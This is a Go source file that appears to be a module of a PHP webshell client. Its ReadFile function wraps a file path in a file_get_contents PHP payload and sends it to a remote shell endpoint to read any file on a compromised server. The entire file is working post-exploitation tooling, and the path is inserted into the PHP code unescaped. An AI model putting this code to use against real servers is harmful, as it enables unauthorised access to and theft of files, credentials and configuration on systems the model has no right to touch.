package phpmodule

import (
	"errors"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboy/adapter/phpadapter"
	"github.com/eatbytes/razboynik/services/config"
	"github.com/eatbytes/razboynik/services/kernel"
)

func ReadFile(kc *kernel.KernelCmd, c *config.Config) (*kernel.KernelCmd, error) {
	var (
		request *razboy.REQUEST
		file    string
		err     error
	)

	file = kc.GetArrItem(1)

	if file == "" {
		return kc, errors.New("You should give the path of the file")
	}

	request = razboy.CreateRequest(
		[4]string{c.Url, c.Method, c.Parameter, c.Key},
		[2]string{c.Shellmethod, kc.GetScope()},
		[2]bool{c.Raw, false},
	)

	request.Action = "$r=file_get_contents('" + file + "');" + phpadapter.CreateAnswer(c.Method, c.Parameter)

	_, err = kc.Send(request)

	return kc, err
}
